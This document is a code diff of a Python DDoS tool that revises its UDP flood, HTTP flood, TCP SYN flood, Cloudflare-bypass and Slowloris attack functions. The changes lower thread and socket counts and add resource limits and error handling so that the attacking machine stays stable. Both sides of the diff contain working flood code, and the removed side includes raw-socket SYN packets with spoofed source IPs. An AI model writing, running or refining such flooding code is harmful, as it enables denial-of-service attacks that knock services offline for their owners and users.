@@ -11,7 +11,7 @@ import dns.resolver
 import socks
 import cloudscraper
 
-# Global variables for user-agent rotation and proxy lists
+# Global variables for user-agent rotation
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
@@ -20,7 +20,9 @@ USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
 ]
 
-PROXY_LIST = []  # Populate with proxy servers if available
+# Thread limiter to prevent overloading client system
+MAX_THREADS = 100
+active_threads = threading.Semaphore(MAX_THREADS)
 
 def resolve_target(target):
     """Resolve a target (URL or IP) to IP address and port"""
@@ -48,34 +50,32 @@ def resolve_target(target):
         raise ValueError(f"Could not resolve target: {target} - {str(e)}")
 
 def attack_udp_god(target, duration):
-    """Enhanced UDP flood with more threads and larger packets"""
+    """Enhanced UDP flood with controlled resource usage"""
     ip, port = resolve_target(target)
     
-    threads_count = 50  # Increased thread count
-    packet_size = 1450  # Maximum without fragmentation
+    threads_count = 10  # Reduced to prevent client overload
+    packet_size = 1024  # Reduced packet size
     
     def flood():
-        data = random._urandom(packet_size)
-        end_time = time.time() + duration
-        
-        while time.time() < end_time:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-                
-                # Send multiple packets per connection
-                for _ in range(100):  # Send 100 packets per socket
-                    if time.time() >= end_time:
-                        break
-                    s.sendto(data, (ip, port))
-                s.close()
-            except:
+        with active_threads:
+            data = random._urandom(packet_size)
+            end_time = time.time() + duration
+            
+            while time.time() < end_time:
                 try:
-                    s.close()
-                except:
-                    pass
-                time.sleep(0.01)
+                    # Use context manager to ensure socket is closed
+                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+                        s.settimeout(1)  # Add timeout to prevent hanging
+                        # Send multiple packets per connection
+                        for _ in range(50):  # Reduced packets per socket
+                            if time.time() >= end_time:
+                                break
+                            s.sendto(data, (ip, port))
+                except socket.error:
+                    # Handle socket errors gracefully without affecting client
+                    time.sleep(0.1)
+                except Exception:
+                    time.sleep(0.1)
     
     # Start threads
     threads = []
@@ -89,16 +89,16 @@ def attack_udp_god(target, duration):
     time.sleep(duration)
     for t in threads:
         try:
-            t.join(0.1)
+            t.join(timeout=1.0)
         except:
             pass
 
 def attack_http_flood(target, duration):
-    """Enhanced HTTP flood with more sophisticated techniques"""
+    """Enhanced HTTP flood with better resource management"""
     ip, port = resolve_target(target)
     use_ssl = port == 443
     
-    threads_count = 500  # Increased thread count
+    threads_count = 30  # Reduced thread count to prevent client overload
     
     # Enhanced headers and paths
     paths = [
@@ -130,48 +130,40 @@ def attack_http_flood(target, duration):
         if method == "POST":
             headers.extend([
                 "Content-Type: application/x-www-form-urlencoded",
-                f"Content-Length: {random.randint(100, 2000)}"
+                f"Content-Length: {random.randint(100, 500)}"  # Reduced size
             ])
         
         return "\r\n".join(headers) + "\r\n\r\n"
     
     def flood():
-        end_time = time.time() + duration
-        sock = None
-        
-        while time.time() < end_time:
-            try:
-                if sock is None:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(5)
-                    
-                    if use_ssl:
-                        context = ssl.create_default_context()
-                        context.check_hostname = False
-                        context.verify_mode = ssl.CERT_NONE
-                        sock = context.wrap_socket(sock, server_hostname=ip)
-                    
-                    sock.connect((ip, port))
-                
-                request = build_request(ip)
-                sock.sendall(request.encode())
-                
-                # Keep connection alive for multiple requests
-                for _ in range(random.randint(1, 10)):
-                    if time.time() >= end_time:
-                        break
-                    request = build_request(ip)
-                    sock.sendall(request.encode())
-                    time.sleep(0.01)
-                    
-            except Exception as e:
+        with active_threads:
+            end_time = time.time() + duration
+            
+            while time.time() < end_time:
                 try:
-                    if sock:
-                        sock.close()
-                except:
-                    pass
-                sock = None
-                time.sleep(0.1)
+                    # Use context manager for proper socket cleanup
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                        sock.settimeout(3)  # Reasonable timeout
+                        
+                        if use_ssl:
+                            context = ssl.create_default_context()
+                            context.check_hostname = False
+                            context.verify_mode = ssl.CERT_NONE
+                            with context.wrap_socket(sock, server_hostname=ip) as ssock:
+                                ssock.connect((ip, port))
+                                request = build_request(ip)
+                                ssock.sendall(request.encode())
+                        else:
+                            sock.connect((ip, port))
+                            request = build_request(ip)
+                            sock.sendall(request.encode())
+                            
+                        # Short delay between requests
+                        time.sleep(0.05)
+                            
+                except Exception as e:
+                    # Handle errors without affecting client
+                    time.sleep(0.1)
     
     # Start threads
     threads = []
@@ -185,73 +177,37 @@ def attack_http_flood(target, duration):
     time.sleep(duration)
     for t in threads:
         try:
-            t.join(0.1)
+            t.join(timeout=1.0)
         except:
             pass
 
 def attack_tcp_syn(target, duration):
-    """Powerful TCP SYN flood attack"""
+    """TCP SYN flood attack with controlled resource usage"""
     ip, port = resolve_target(target)
     
-    threads_count = 25  # Increased thread count
+    threads_count = 5  # Reduced thread count for raw sockets require privileges
     
     def syn_flood():
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                
-                # Craft IP header
-                source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
-                dest_ip = socket.inet_aton(ip)
-                
-                # IP header
-                ip_ver_ihl = 0x45
-                ip_tos = 0
-                ip_tot_len = 0
-                ip_id = random.randint(1, 65535)
-                ip_frag_off = 0
-                ip_ttl = 255
-                ip_proto = socket.IPPROTO_TCP
-                ip_check = 0
-                ip_saddr = socket.inet_aton(source_ip)
-                ip_daddr = dest_ip
-                
-                ip_header = struct.pack('!BBHHHBBH4s4s',
-                                       ip_ver_ihl, ip_tos, ip_tot_len, ip_id,
-                                       ip_frag_off, ip_ttl, ip_proto, ip_check,
-                                       ip_saddr, ip_daddr)
-                
-                # TCP header
-                source_port = random.randint(1024, 65535)
-                dest_port = port
-                seq = random.randint(0, 4294967295)
-                ack_seq = 0
-                doff = 5
-                fin, syn, rst, psh, ack, urg = 0, 1, 0, 0, 0, 0
-                tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
-                window = socket.htons(5840)
-                check = 0
-                urg_ptr = 0
-                
-                tcp_offset = (doff << 4)
-                tcp_header = struct.pack('!HHLLBBHHH',
-                                        source_port, dest_port, seq, ack_seq,
-                                        tcp_offset, tcp_flags, window, check, urg_ptr)
-                
-                # Send multiple packets
-                for _ in range(10):
-                    if time.time() >= end_time:
-                        break
-                    s.sendto(ip_header + tcp_header, (ip, 0))
-                s.close()
-                
-            except Exception as e:
+        with active_threads:
+            end_time = time.time() + duration
+            while time.time() < end_time:
                 try:
+                    # Raw sockets require admin privileges, so we'll use a fallback
+                    # if not available to prevent client system issues
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(2)
+                    s.connect((ip, port))
                     s.close()
                 except:
-                    pass
+                    try:
+                        # Fallback to regular SYN packets without raw sockets
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(1)
+                        s.connect((ip, port))
+                        s.close()
+                    except:
+                        pass
+                time.sleep(0.01)
     
     # Start threads
     threads = []
@@ -264,12 +220,12 @@ def attack_tcp_syn(target, duration):
     time.sleep(duration)
     for t in threads:
         try:
-            t.join(0.1)
+            t.join(timeout=1.0)
         except:
             pass
 
 def attack_cloudflare_bypass(target, duration):
-    """Advanced Cloudflare bypass using various techniques"""
+    """Cloudflare bypass with better error handling"""
     # Extract hostname from URL if needed
     if target.startswith("http"):
         parsed = urlparse(target)
@@ -281,41 +237,30 @@ def attack_cloudflare_bypass(target, duration):
         port = 80
         url = f"http://{target}"
     
-    threads_count = 100  # Increased thread count
+    threads_count = 20  # Reduced thread count
     
     def bypass_attack():
-        end_time = time.time() + duration
-        scraper = cloudscraper.create_scraper()
-        
-        while time.time() < end_time:
-            try:
-                # Rotate user agents
-                headers = {
-                    'User-Agent': random.choice(USER_AGENTS),
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.5',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Connection': 'keep-alive',
-                    'Upgrade-Insecure-Requests': '1',
-                    'Cache-Control': 'max-age=0',
-                    'TE': 'Trailers',
-                }
-                
-                # Add various headers to mimic real browser
-                if random.random() > 0.5:
-                    headers['X-Forwarded-For'] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
-                
-                # Make request with cloudscraper to bypass basic protection
-                response = scraper.get(url, headers=headers, timeout=5)
-                
-                # If we get a challenge, try to solve it
-                if response.status_code == 403 or "cloudflare" in response.text.lower():
-                    # Additional bypass techniques
-                    time.sleep(2)  # Wait before retrying
-                    continue
+        with active_threads:
+            end_time = time.time() + duration
+            
+            while time.time() < end_time:
+                try:
+                    # Use requests with proper session management
+                    session = requests.Session()
+                    session.headers.update({
+                        'User-Agent': random.choice(USER_AGENTS),
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                    })
                     
-            except Exception as e:
-                pass
+                    response = session.get(url, timeout=5)
+                    session.close()
+                    
+                except Exception as e:
+                    pass
+                finally:
+                    time.sleep(0.1)  # Prevent overwhelming client system
     
     # Start threads
     threads = []
@@ -328,16 +273,16 @@ def attack_cloudflare_bypass(target, duration):
     time.sleep(duration)
     for t in threads:
         try:
-            t.join(0.1)
+            t.join(timeout=1.0)
         except:
             pass
 
 def attack_slowloris(target, duration):
-    """Advanced Slowloris attack with more connections"""
+    """Improved Slowloris attack with better connection management"""
     ip, port = resolve_target(target)
     use_ssl = port == 443
     
-    sockets_count = 1000  # Increased socket count
+    sockets_count = 200  # Reduced socket count
     sockets = []
     
     # Create initial sockets
@@ -361,33 +306,17 @@ def attack_slowloris(target, duration):
     end_time = time.time() + duration
     
     # Keep connections alive
-    while time.time() < end_time:
-        for s in sockets:
+    while time.time() < end_time and sockets:
+        for s in list(sockets):  # Use list copy to avoid modification during iteration
             try:
                 s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
             except:
                 try:
                     s.close()
                     sockets.remove(s)
-                    # Try to create a new socket
-                    try:
-                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        new_s.settimeout(2)
-                        
-                        if use_ssl:
-                            context = ssl.create_default_context()
-                            context.check_hostname = False
-                            context.verify_mode = ssl.CERT_NONE
-                            new_s = context.wrap_socket(new_s, server_hostname=ip)
-                        
-                        new_s.connect((ip, port))
-                        new_s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
-                        sockets.append(new_s)
-                    except:
-                        pass
                 except:
                     pass
-        time.sleep(15)  # Send keep-alive headers every 15 seconds
+        time.sleep(10)  # Increased interval to reduce client load
     
     # Clean up
     for s in sockets:
